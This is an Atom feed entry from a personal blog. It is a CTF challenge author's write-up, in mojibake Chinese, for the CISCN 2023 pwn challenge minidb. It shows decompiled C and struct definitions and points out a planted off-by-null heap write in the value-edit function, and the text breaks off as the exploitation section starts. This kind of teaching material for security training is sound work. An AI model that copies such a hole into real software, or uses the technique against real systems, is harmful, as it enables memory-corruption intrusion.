<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3çš„ç§˜å¯†å°å±‹</subtitle>
  <link href="http://blog.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.arttnba3.cn/"/>
  <updated>2023-07-17T05:44:44.317Z</updated>
  <id>http://blog.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€CTF.0x09ã€‘CISCN 2023 åä¸œåŒ—åˆ†åŒºèµ› minidbã€kkk å‡ºé¢˜æ‰‹è®°</title>
    <link href="http://blog.arttnba3.cn/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/"/>
    <id>http://blog.arttnba3.cn/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/</id>
    <published>2023-07-14T01:43:35.000Z</published>
    <updated>2023-07-17T05:44:44.317Z</updated>
    
    <content type="html"><![CDATA[<p>ç»å…¸å‡ºé¢˜æ²¡äººæ„¿æ„åš</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ç¬¬ä¸€æ¬¡å¸®å›½èµ›å‡ºé¢˜ï¼ˆ<del>ä¸»è¦æ˜¯å¬è¯´æœ‰ğŸ’´æ°</del>ï¼‰ï¼Œä¸å‡ºæ„å¤–çš„è¯åº”è¯¥ä¹Ÿæ˜¯æœ¬ç§‘é˜¶æ®µæœ€åä¸€æ¬¡å‡º CTF Pwn é¢˜ç›®äº†ï¼ŒåŒæ—¶è¿™ä¹Ÿæ˜¯ç¬”è€…ç¬¬ä¸€æ¬¡å‡º AWDP çš„é¢˜ç›®ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ ï¼šï¼‰</p><p>å› ä¸ºçŸ­æ—¶é—´å†…ç¡®å®æ˜¯æƒ³ä¸å‡ºä»€ä¹ˆæ–°ä¸œè¥¿äº†æ‰€ä»¥å‡ºäº†ä¸¤é“æ¯”è¾ƒå¥—è·¯åŒ–çš„é¢˜ç›®ï¼Œå¯æƒœè§£é¢˜ç‡ä¼¼ä¹æœ‰ç‚¹ä¸å°½äººæ„ï¼Œä¼°è®¡å¤§ä½¬ä»¬åº”è¯¥éƒ½ä¸å±‘äºåšç¬”è€…å‡ºçš„çƒ‚é¢˜å§ :ï¼ˆ</p><h1 id="0x01-minidbï¼ˆç®€å•ï¼‰"><a href="#0x01-minidbï¼ˆç®€å•ï¼‰" class="headerlink" title="0x01. minidbï¼ˆç®€å•ï¼‰"></a>0x01. minidbï¼ˆç®€å•ï¼‰</h1><p>è¿™é“é¢˜å‡ºé¢˜æ—¶çš„éš¾åº¦è®¾ç½®ä¾¿æ˜¯ <code>ç®€å•</code> ï¼Œæ‰€ä»¥ç¬”è€…æ˜¯æŒ‰ç…§ç­¾åˆ°é¢˜çš„éš¾åº¦å»å‡ºçš„ï¼Œä¸è¿‡è™½ç„¶æˆåŠŸ <code>fix</code> çš„é˜Ÿä¼ä¸å°‘ï¼Œä½†æ˜¯æˆåŠŸ <code>break</code> çš„é˜Ÿä¼ä¼¼ä¹å¹¶å¦‚é¢„æœŸä¸å¤šğŸ¤”ï¼ˆ<del>ä¿®éƒ½ä¿®äº†æ‰“è¿˜ä¸ä¼šæ‰“ğŸï¼Œä½ ä»¬æ˜¯ä¸æ˜¯å·å·è—äº†ä»€ä¹ˆğŸ‘´ä¸çŸ¥é“çš„é€šé˜²æ‰‹æ®µ</del>ï¼‰</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹ä¿®ä¸ªè·³è¡¨ï¼š</p><p><img src="https://s2.loli.net/2023/07/07/VpuMXz3L9vFgiRC.png" alt="IDA ä¿®å¤è·³è¡¨.png"></p><p>æä¾›äº†ä¸¤å±‚å †èœå•ï¼Œç¬¬ä¸€å±‚å¯ä»¥è®©ç”¨æˆ·åˆ›å»ºã€ä½¿ç”¨ã€åˆ é™¤ã€å±•ç¤ºã€é‡å‘½åæ•°æ®åº“ï¼š</p><p><img src="https://s2.loli.net/2023/07/12/tbZT75vorwOKMnj.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1547</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_139F();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    v2 = v1;<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">5</span> )<br>    &#123;<br>LABEL_6:<br>      <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>        <span class="hljs-keyword">continue</span>;<br>LABEL_15:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v2 &lt;= <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">5</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    <span class="hljs-keyword">switch</span> ( v2 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_15;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        sub_1D38();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = sub_2080();<br>        <span class="hljs-keyword">if</span> ( v3 )<br>          sub_1451(v3);<br>        v3 = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        sub_21C1();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        sub_23EA();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        sub_247F();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_6;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v2 != <span class="hljs-number">666</span> );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;See you next time~&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æ•°æ®åº“çš„åˆ›å»ºä¼šåˆ†é…ä¸¤ä¸ª chunkï¼Œä¸€ä¸ªç”¨ä½œæ•°æ®åº“æœ¬ä½“ï¼Œå¦ä¸€ä¸ªç”¨ä½œæ•°æ®åº“çš„åå­—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1D38</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-130h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-12Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+8h] [rbp-128h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-124h]</span><br>  <span class="hljs-type">void</span> **v5; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">void</span> *ptr; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !dword_6088 )<br>    dword_6088 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( dword_608C &lt;= <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !qword_6060[i] )<br>      &#123;<br>        v5 = (<span class="hljs-type">void</span> **)&amp;qword_6060[i];<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    ptr = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, <span class="hljs-number">0x810</span>uLL);<br>    <span class="hljs-keyword">if</span> ( ptr )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the name of database: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s2);<br>      <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">4</span>; ++j )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( qword_6060[j] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(qword_6060[j] + <span class="hljs-number">8LL</span>), s2) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] There&#x27;s already another database with the same name!\x1B[0m&quot;</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>      &#125;<br>      v4 = <span class="hljs-built_in">strlen</span>(s2);<br>      *((_QWORD *)ptr + <span class="hljs-number">1</span>) = <span class="hljs-built_in">malloc</span>(v4 + <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> ( *((_QWORD *)ptr + <span class="hljs-number">1</span>) )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>(*((<span class="hljs-type">char</span> **)ptr + <span class="hljs-number">1</span>), s2);<br>        *(_BYTE *)(*((_QWORD *)ptr + <span class="hljs-number">1</span>) + v4) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now you can set the type of your databse. Here&#x27;s available choices:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. int32 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. int64 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. int32 to str[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. int64 to strr[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;(Note that the string should end with a &#x27;\\0&#x27;, so the max length of input is 127/255)&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the type of database: &quot;</span>);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>        <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">4</span> &amp;&amp; v1 )<br>        &#123;<br>          *(_DWORD *)ptr = v1;<br>          *v5 = ptr;<br>          ++dword_608C;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Succesfully create a new database with name \&quot;%s\&quot;!\n&quot;</span>, s2);<br>          <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid type of database!\x1B[0m&quot;</span>);<br>        <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)ptr + <span class="hljs-number">1</span>));<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db name!\x1B[0m&quot;</span>);<br>      &#125;<br>LABEL_24:<br>      <span class="hljs-built_in">free</span>(ptr);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db!\x1B[0m&quot;</span>);<br>    &#125;<br>    *v5 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] You&#x27;ve already got too many databases!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚å †èœå•åˆ™æä¾›äº†å¯¹æ•°æ®åº“å†…é”®å€¼å¯¹æ•°æ®çš„å¢åŠ ã€æŸ¥è¯¢ã€æ›´æ–°ã€åˆ é™¤æ“ä½œï¼š</p><p><img src="https://s2.loli.net/2023/07/12/yEmj24xGUVwt7Os.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1451</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_13FE();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    v3 = v2;<br>    <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">666</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      &#123;<br>        sub_1C47(a1);<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-keyword">switch</span> ( v3 )<br>        &#123;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            sub_1A81(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            sub_1712(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            sub_19BD(a1);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 != <span class="hljs-number">666</span> );<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­åˆ¤æ–­æ˜¯å¦å­˜åœ¨é‡å¤é”®çš„é€»è¾‘å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹å‡ºæ•°æ®å‚¨å­˜æ–¹å¼æ˜¯å“ˆå¸Œè¡¨ + å•å‘é“¾è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">sub_168D</span><span class="hljs-params">(__int64 a1, __int64 a2, _QWORD *a3)</span><br>&#123;<br>  _QWORD *v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  _QWORD *v5; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br><br>  v4 = *(_QWORD **)(a1 + <span class="hljs-number">8</span> * ((<span class="hljs-type">unsigned</span> __int8)a2 + <span class="hljs-number">2LL</span>)); <span class="hljs-comment">/* hash to %256 */</span><br>  v5 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a2 == v4[<span class="hljs-number">1</span>] )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( a3 )<br>        *a3 = v5;<br>      <span class="hljs-keyword">return</span> v4;<br>    &#125;<br>    v5 = v4;<br>    v4 = (_QWORD *)*v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥é€†å‘å‡ºæ•°æ®åº“ä¸é”®å€¼å¯¹çš„ç»“æ„ä½“å®šä¹‰åˆ†åˆ«å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">int64_t</span> key;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0</span>]; <span class="hljs-comment">/* 128 or 256 here */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">database</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> type;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">db_item</span> *<span class="hljs-title">kv</span>[256];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘é”®å€¼å¯¹çš„åŠŸèƒ½ä¸­ï¼Œè¿™é‡Œåœ¨è¯»å–ç”¨æˆ·è¾“å…¥åä¼šå…ˆåœ¨é”®å€¼å¯¹æœ«å°¾æ”¾ç½® <code>&#39;\0&#39;</code> åå†æ£€æŸ¥é•¿åº¦ï¼Œè™½ç„¶é™åˆ¶äº†æœ€å¤§è¾“å…¥é•¿åº¦ä¸º 255 å­—ç¬¦ï¼Œä½†é”®å€¼å¯¹çš„å€¼é•¿åº¦æœ‰ <code>128</code> å’Œ <code>256</code> ä¸¤ç§ç±»å‹ï¼Œ<strong>å¯¹äºå‰è€…è€Œè¨€æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œæˆä¸€ä¸ªå †ä¸Šè¶Šç•Œå†™ \0</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1A81</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-224h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+20h] [rbp-220h] BYREF</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-218h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-210h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+238h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the key: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v3);<br>    v4 = sub_168D(a1, v3, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the new value: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s);<br>      v2 = <span class="hljs-built_in">strlen</span>(s);<br>      *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>; <span class="hljs-comment">/* vulnerability here */</span><br>      <span class="hljs-keyword">if</span> ( (*a1 == <span class="hljs-number">1</span> || *a1 == <span class="hljs-number">2</span>) &amp;&amp; v2 &gt; <span class="hljs-number">127</span> || (*a1 == <span class="hljs-number">3</span> || *a1 == <span class="hljs-number">4</span>) &amp;&amp; v2 &gt; <span class="hljs-number">255</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span> *)(v4 + <span class="hljs-number">16</span>), s, v2);<br>        *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Succesfully update the value of specific key!&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç”±äºæ˜¯ç­¾åˆ°é¢˜éš¾åº¦æ‰€ä»¥è§£æ³•æ¯”è¾ƒä¿—ï¼Œç®€å•é£æ°´ä¸€ä¸‹åˆ©ç”¨è¶Šç•Œå†™æ”¹ä¸€ä¸ªæ•°æ®åº“çš„ <code>database-&gt;name</code> 